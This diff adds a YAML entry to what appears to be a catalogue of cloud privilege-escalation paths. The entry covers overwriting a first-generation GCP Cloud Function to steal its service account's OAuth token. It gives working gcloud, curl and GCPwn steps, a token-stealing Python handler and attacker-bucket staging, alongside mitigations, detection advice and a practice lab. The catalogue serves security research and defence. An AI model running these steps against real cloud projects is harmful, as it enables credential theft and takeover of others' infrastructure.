@@ -1,0 +1,292 @@
+id: gcp-cloudfunctionsv1-002
+name: iam.serviceAccounts.actAs + cloudfunctions.functions.update + cloudfunctions.functions.call
+category: existing-passrole
+services:
+- iam
+- cloudfunctions
+permissions:
+  required:
+  - permission: iam.serviceAccounts.actAs
+    resourceType: service-account
+    resourceConstraints: Must be granted on the function's existing runtime/target service account (serviceAccountEmail) -- the privileged account the function runs as and whose OAuth token the attacker steals. A gen1 UpdateFunction re-checks actAs on the existing runtime SA even for a code-only update
+  - permission: iam.serviceAccounts.actAs
+    resourceType: service-account
+    resourceConstraints: Must be granted on the function's existing Cloud Build build service account (buildServiceAccount) -- a gen1 code update re-runs the build and re-checks actAs on the existing build SA, so this is a second, distinct actAs requirement (realistically a separate minimal account, not the privileged runtime SA). The build account needs the `is_cf_build_capable` minimum -- `artifactregistry.repositories.downloadArtifacts`, `artifactregistry.repositories.uploadArtifacts`, and `logging.logEntries.create`, satisfied by `roles/cloudbuild.builds.builder`
+  - permission: cloudfunctions.functions.update
+    resourceType: cloudfunction
+    resourceConstraints: Must be granted on the existing first-generation function to overwrite its source code (the runtime and build service accounts can be left unchanged -- the update re-checks actAs on both regardless)
+  - permission: cloudfunctions.functions.call
+    resourceType: cloudfunction
+    resourceConstraints: Must be granted on the deployed function to synchronously invoke it through the Cloud Functions v1 CallFunction API and read the returned token. Invocation is required because a gen1 function is not backed by Cloud Run -- the updated container cold-starts only on the first HTTP call
+  additional:
+  - permission: cloudfunctions.functions.sourceCodeSet
+    resourceType: cloudfunction
+    resourceConstraints: Required only for the gcloud/`generateUploadUrl` source path; not needed when supplying `sourceArchiveUrl` pointing at an attacker-controlled external bucket via the raw REST API
+  - permission: cloudfunctions.operations.get
+    resourceConstraints: Polls the asynchronous update operation until the function is active. Not strictly required -- a gen1 function is invoked by name, so you can instead sleep and retry the CallFunction invoke until it succeeds. Also called internally by `gcloud functions deploy`
+  - permission: cloudfunctions.functions.get
+    resourceConstraints: Required only by `gcloud functions deploy`, which calls GetFunction to decide between create and update; not needed via the REST API
+  - permission: resourcemanager.projects.get
+    resourceConstraints: Required only by `gcloud functions deploy`, which reads project metadata as a preflight; not needed via the REST API
+  - permission: iam.serviceAccounts.list
+    resourceConstraints: Helpful for enumerating service accounts in the project to identify privileged targets
+  - permission: iam.serviceAccounts.getIamPolicy
+    resourceConstraints: Useful for inspecting service account IAM policies to identify targets on which the attacker holds `iam.serviceAccounts.actAs`
+description: A principal with `iam.serviceAccounts.actAs` on an existing gen1 Cloud Function's runtime and build service accounts, plus `cloudfunctions.functions.update` and `cloudfunctions.functions.call`, can update that first-generation (gen1) Cloud Function -- overwriting its source code with attacker-controlled code while it keeps running as its existing privileged service account -- then synchronously invoke it through the Cloud Functions CallFunction API and retrieve that service account's OAuth access token from the metadata server. The attacker can then use the stolen token with all permissions granted to the attached service account. Unlike second-generation functions (`gcp-cloudrunservicefunctions-002`, which run on Cloud Run and execute at deploy time), a gen1 function is not backed by Cloud Run and is invoked directly through `cloudfunctions.functions.call`, so no Cloud Run permission is involved.
+prerequisites:
+  admin:
+  - An existing first-generation Cloud Function must exist that the attacker can update (`cloudfunctions.functions.update`), whose runtime service account is privileged
+  - The attacker must hold `iam.serviceAccounts.actAs` on the function's runtime service account (the privileged account it runs as) AND on its Cloud Build build service account -- a gen1 code update re-checks actAs on both
+  - The runtime service account must hold `roles/owner`, `roles/editor`, or an equivalent administrative custom role
+  - The Cloud Functions, Cloud Build, and Artifact Registry APIs and their service agents must be available. The build service account needs the `is_cf_build_capable` minimum (`artifactregistry.repositories.downloadArtifacts`, `artifactregistry.repositories.uploadArtifacts`, `logging.logEntries.create`; add `storage.objects.get` + `storage.objects.create` when the source is hosted inside the target project rather than an external bucket), satisfied by `roles/cloudbuild.builds.builder`. If `buildServiceAccount` is omitted, gen1 falls back to the Compute Engine default service account and the attacker needs `iam.serviceAccounts.actAs` on that account instead
+  lateral:
+  - An existing first-generation Cloud Function must exist that the attacker can update (`cloudfunctions.functions.update`)
+  - The attacker must hold `iam.serviceAccounts.actAs` on the function's runtime service account AND its build service account (gen1 re-checks both on update)
+  - The target service account must hold permissions that provide useful access beyond the attacker's starting principal
+exploitationSteps:
+  gcloud:
+  - step: 1
+    command: |
+      mkdir -p /tmp/function-exfil && cd /tmp/function-exfil
+      cat > main.py <<'PYEOF'
+      import json
+      import urllib.request
+
+      def exfiltrate_token(request):
+          req = urllib.request.Request(
+              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+              headers={"Metadata-Flavor": "Google"},
+          )
+          with urllib.request.urlopen(req, timeout=5) as response:
+              return (json.dumps(json.loads(response.read())), 200, {"Content-Type": "application/json"})
+      PYEOF
+      printf 'functions-framework==3.*\n' > requirements.txt
+    description: Create a malicious HTTP function that returns the OAuth access token of the service account attached to its runtime
+  - step: 2
+    command: |
+      gcloud functions deploy FUNCTION_NAME \
+        --no-gen2 \
+        --runtime=python310 \
+        --region=REGION \
+        --source=/tmp/function-exfil \
+        --entry-point=exfiltrate_token \
+        --trigger-http \
+        --service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --build-service-account=projects/PROJECT_ID/serviceAccounts/BUILD_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --format=json
+    description: Update the existing first-generation function in place (gcloud functions deploy overwrites it) so it executes as the privileged target service account (`--no-gen2` forces gen1). In addition to the required permission set, `gcloud functions deploy` needs the additional `cloudfunctions.functions.get` and `resourcemanager.projects.get` permissions.
+  - step: 3
+    command: |
+      gcloud functions call FUNCTION_NAME \
+        --no-gen2 \
+        --region=REGION \
+        --data='{}'
+    description: Synchronously invoke the function through the Cloud Functions v1 CallFunction API (`cloudfunctions.functions.call`). The attacker-controlled handler queries the metadata server and returns the attached service account's OAuth token in the call result.
+  - step: 4
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_RETURNED_BY_FUNCTION"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the exfiltrated bearer token directly against Google APIs to operate as the target service account
+  curl:
+  - step: 1
+    command: |
+      mkdir -p /tmp/function-exfil && cd /tmp/function-exfil
+      cat > main.py <<'PYEOF'
+      import json
+      import urllib.request
+
+      def exfiltrate_token(request):
+          req = urllib.request.Request(
+              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+              headers={"Metadata-Flavor": "Google"},
+          )
+          with urllib.request.urlopen(req, timeout=5) as response:
+              return (json.dumps(json.loads(response.read())), 200, {"Content-Type": "application/json"})
+      PYEOF
+      printf 'functions-framework==3.*\n' > requirements.txt
+      zip -qr source.zip main.py requirements.txt
+      ACCESS_TOKEN=$(gcloud auth print-access-token)
+      gsutil cp source.zip gs://ATTACKER_BUCKET/func.zip
+    description: Package the malicious replacement source and stage it in an attacker-controlled external bucket readable by the build service account and the Cloud Functions service agent. Referencing the zip by `sourceArchiveUrl` avoids the `generateUploadUrl` call and therefore does not need `cloudfunctions.functions.sourceCodeSet`.
+  - step: 2
+    command: |
+      UPDATE_RESPONSE=$(curl -sS -X PATCH \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        "https://cloudfunctions.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/functions/FUNCTION_NAME?updateMask=sourceArchiveUrl,entryPoint,runtime,serviceAccountEmail,buildServiceAccount" \
+        -d "{
+          \"name\": \"projects/PROJECT_ID/locations/REGION/functions/FUNCTION_NAME\",
+          \"entryPoint\": \"exfiltrate_token\",
+          \"runtime\": \"python310\",
+          \"sourceArchiveUrl\": \"gs://ATTACKER_BUCKET/func.zip\",
+          \"serviceAccountEmail\": \"TARGET_SA@PROJECT_ID.iam.gserviceaccount.com\",
+          \"buildServiceAccount\": \"projects/PROJECT_ID/serviceAccounts/BUILD_SA@PROJECT_ID.iam.gserviceaccount.com\"
+        }")
+      OPERATION_NAME=$(echo "$UPDATE_RESPONSE" | jq -r '.name')
+    description: Update the existing gen1 function with `cloudfunctions.functions.update`, overwriting its source via `sourceArchiveUrl` (no `cloudfunctions.functions.sourceCodeSet` needed). The runtime identity (`serviceAccountEmail`, the privileged target) and the Cloud Build build identity (`buildServiceAccount`, a separate account) are left in place; a gen1 code update re-checks `iam.serviceAccounts.actAs` on both, so the attacker needs actAs on both the runtime SA and the build SA
+  - step: 3
+    command: |
+      while true; do
+        OPERATION=$(curl -sS \
+          -H "Authorization: Bearer $ACCESS_TOKEN" \
+          "https://cloudfunctions.googleapis.com/v1/$OPERATION_NAME")
+        [ "$(echo "$OPERATION" | jq -r '.done // false')" = "true" ] && break
+        sleep 10
+      done
+    description: Poll the long-running update with `cloudfunctions.operations.get` until the function is active. This polling is optional -- without `cloudfunctions.operations.get` you can simply sleep and retry the CallFunction invoke in the next step until it succeeds
+  - step: 4
+    command: |
+      CALL_RESPONSE=$(curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        "https://cloudfunctions.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/functions/FUNCTION_NAME:call" \
+        -d '{"data":"{}"}')
+      EXFILTRATED_TOKEN=$(echo "$CALL_RESPONSE" | jq -r '.result | fromjson | .access_token')
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Invoke the function with `cloudfunctions.functions.call` through the CallFunction API, extract the attached service account's token from the `result` field, and use it directly against Google APIs
+  gcpwn:
+  - step: 1
+    command: |
+      modules run exploit_cloudfunctions_function_as_sa \
+        --project-id PROJECT_ID \
+        --function-name FUNCTION_NAME \
+        --target-sa TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --v1 \
+        --update \
+        --invoke \
+        --source-uri gs://ATTACKER_BUCKET/function-exfil.zip
+    description: Use Scott Weston and NetSPI's GCPwn Cloud Functions module to update and invoke an existing first-generation function as the target service account. The update re-runs the build under the function's build service account, which the caller needs `iam.serviceAccounts.actAs` on. `function-exfil.zip` must be a pre-staged GCPwn-compatible token-exfiltration payload in an attacker-controlled bucket the Cloud Functions build process can read.
+  - step: 2
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_RECOVERED_BY_GCPWN"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the OAuth token recovered by GCPwn directly against Google APIs as the attached service account
+recommendation: |
+  High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid privileged service accounts on Cloud Functions** - Very rarely does a Cloud Function need `roles/editor` or `roles/owner`. Give each function a dedicated service account with only the roles it needs.
+  - **Grant `iam.serviceAccounts.actAs` on specific service accounts, not the project** - Bind `roles/iam.serviceAccountUser` (or a custom role with `iam.serviceAccounts.actAs`) on the individual service account a deployer needs, never at the project or folder level, where it covers every service account.
+  Use IAM Conditions to narrow the grant further:
+
+  ```json
+  {
+    "role": "roles/iam.serviceAccountUser",
+    "members": ["serviceAccount:deployer@PROJECT_ID.iam.gserviceaccount.com"],
+    "condition": {
+      "title": "deploy-window-only",
+      "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
+    }
+  }
+  ```
+
+  - Monitor Cloud Audit Logs for `google.cloud.functions.v1.CloudFunctionsService.UpdateFunction` events that set a service account the caller has not deployed with before.
+  - Monitor Cloud Audit Logs for Cloud Function updates by principals who do not usually modify functions, especially when followed quickly by a `CallFunction` invocation of the new function.
+  - Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that grant `iam.serviceAccounts.actAs` through `roles/iam.serviceAccountUser` or a custom role, particularly at project scope.
+  - Regularly audit which service accounts Cloud Functions run as and down-scope any with `roles/editor` or `roles/owner`.
+  - Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
+limitations: |
+  This path provides administrative access only when the attached target service account has administrative project permissions such as `roles/owner`, `roles/editor`, or an equivalent custom role. If it has narrower permissions, the attacker receives only that limited access, although it may enable further lateral movement or multi-hop escalation.
+
+  The attacker must be able to invoke the updated function. For a gen1 function this requires `cloudfunctions.functions.call` (the CallFunction API), not `run.routes.invoke` -- gen1 functions are not backed by Cloud Run and do not execute at deploy time. A gen1 code update re-runs the build and re-checks `iam.serviceAccounts.actAs` on the function's existing runtime service account AND its build service account, so the attacker needs actAs on both; the build account needs the `is_cf_build_capable` minimum (`artifactregistry.repositories.downloadArtifacts`, `artifactregistry.repositories.uploadArtifacts`, `logging.logEntries.create` with an external source bucket -- add `storage.objects.get` and `storage.objects.create` when the source is in the target project). If `buildServiceAccount` is unset, the build uses the Compute Engine default service account and actAs is needed on that. The stolen OAuth token is short-lived, but the attacker can invoke the function again while it exists to obtain another token.
+discoveryAttribution:
+  firstDocumented:
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2020
+    link: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+references:
+- title: Privilege Escalation in Google Cloud Platform - Part 1 (IAM) - Rhino Security Labs
+  url: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+- title: RhinoSecurityLabs/GCP-IAM-Privilege-Escalation - cloudfunctions.functions.create+call exploit script
+  url: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py
+- title: GCP - Cloud Functions Privilege Escalation - HackTricks Cloud
+  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-cloudfunctions-privesc.html
+- title: GCPwn Cloud Functions service account exploitation module - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/933a3e239474498eb447a234530965357ebc45b5/gcpwn/modules/gcp/cloudfunctions/exploit/exploit_cloudfunctions_function_as_sa.py
+- title: GCPwn UPDATE_AND_INVOKE_CLOUDFUNCTION_V1_AS_SA OpenGraph edge - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/933a3e239474498eb447a234530965357ebc45b5/gcpwn/mappings/og_defined_edges.json#L879-L945
+- title: Call functions directly (CallFunction) - Cloud Functions v1 API
+  url: https://cloud.google.com/functions/docs/reference/rest/v1/projects.locations.functions/call
+- title: Cloud Functions IAM roles - Google Cloud
+  url: https://cloud.google.com/functions/docs/reference/iam/roles
+relatedPaths:
+- gcp-cloudfunctionsv1-001
+- gcp-cloudrunservicefunctions-002
+- gcp-cloudrunserviceimages-002
+- lambda-001
+detectionTools:
+  gcpwn: https://github.com/NetSPI/GCPwn/blob/933a3e239474498eb447a234530965357ebc45b5/gcpwn/mappings/og_defined_edges.json#L879-L945
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: modules/scenarios/gcp/single-account/privesc-one-hop/to-admin/gcp-cloudfunctionsv1-002-cloudfunctions-functionsupdate
+    description: "Deploy Terraform into your own GCP project to practice this exact attack path: use `iam.serviceAccounts.actAs` with Cloud Functions creation and source-upload permissions to deploy a first-generation function as a privileged service account, invoke it through the CallFunction API, and exfiltrate its OAuth token from the metadata server."
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: The attacker's starting GCP principal. It can be a user or service account and holds `iam.serviceAccounts.actAs` on a more privileged target service account, along with the Cloud Functions deployment and invocation permissions required to create and call attacker-controlled code as that identity.
+  - id: cloud_function
+    label: Existing Cloud Function
+    type: resource
+    description: An existing first-generation HTTP Cloud Function whose source the attacker overwrites with attacker-controlled code, reconfiguring it to run as the target service account as its runtime identity.
+  - id: target_sa
+    label: Attached Service Account
+    type: principal
+    description: The existing service account attached to the function through `iam.serviceAccounts.actAs`. Code running inside the function receives this service account's identity and can request its short-lived OAuth access token from the metadata server. The value of the attack depends on the permissions already granted to this service account.
+  - id: exfiltrate_token
+    label: Exfiltrate OAuth Token
+    type: payload
+    color: '#99ccff'
+    description: The attacker synchronously invokes the function via the CallFunction API, whose malicious handler queries the metadata server and returns the attached service account's OAuth access token in the call result. The attacker can then use the bearer token directly against Google APIs as the target service account.
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    color: '#99ff99'
+    description: The attached service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role. Using its exfiltrated token gives the attacker effective administrative access to the project for the token's lifetime.
+  - id: limited_access
+    label: Limited Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: The attached service account holds useful but non-administrative permissions. The attacker inherits only that scoped access, although it may enable lateral movement, sensitive data access, or another privilege escalation path.
+  - id: no_access
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: The attached service account has minimal permissions or no meaningful access beyond the starting principal, so stealing its OAuth token provides no material privilege gain.
+  edges:
+  - from: start
+    to: cloud_function
+    label: iam.serviceAccounts.actAs + cloudfunctions.functions.update
+    description: The attacker uploads malicious source code and creates a first-generation Cloud Function configured to run as the target service account. `cloudfunctions.functions.sourceCodeSet` and `cloudfunctions.operations.get` support source staging and deployment tracking.
+  - from: cloud_function
+    to: target_sa
+    label: Function runs as attached service account
+    description: The Cloud Functions runtime starts the attacker-controlled handler with the target service account attached, making short-lived credentials for that principal available through the metadata server.
+  - from: target_sa
+    to: exfiltrate_token
+    label: cloudfunctions.functions.call
+    description: The attacker synchronously invokes the function through the Cloud Functions v1 CallFunction API. The handler queries the metadata server and returns the attached service account's OAuth token in the call result.
+  - from: exfiltrate_token
+    to: admin
+    label: If service account has administrative permissions
+    branch: A
+    condition: admin
+    description: If the attached service account has administrative permissions, requests made with the exfiltrated token provide effective administrative control of the project.
+  - from: exfiltrate_token
+    to: limited_access
+    label: If service account has narrower permissions
+    branch: B
+    condition: some_permissions
+    description: If the attached service account has scoped permissions, the token grants those permissions and may enable lateral movement or a multi-hop escalation.
+  - from: exfiltrate_token
+    to: no_access
+    label: If service account has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: If the attached service account has no meaningful additional permissions, the token does not produce a useful privilege escalation.
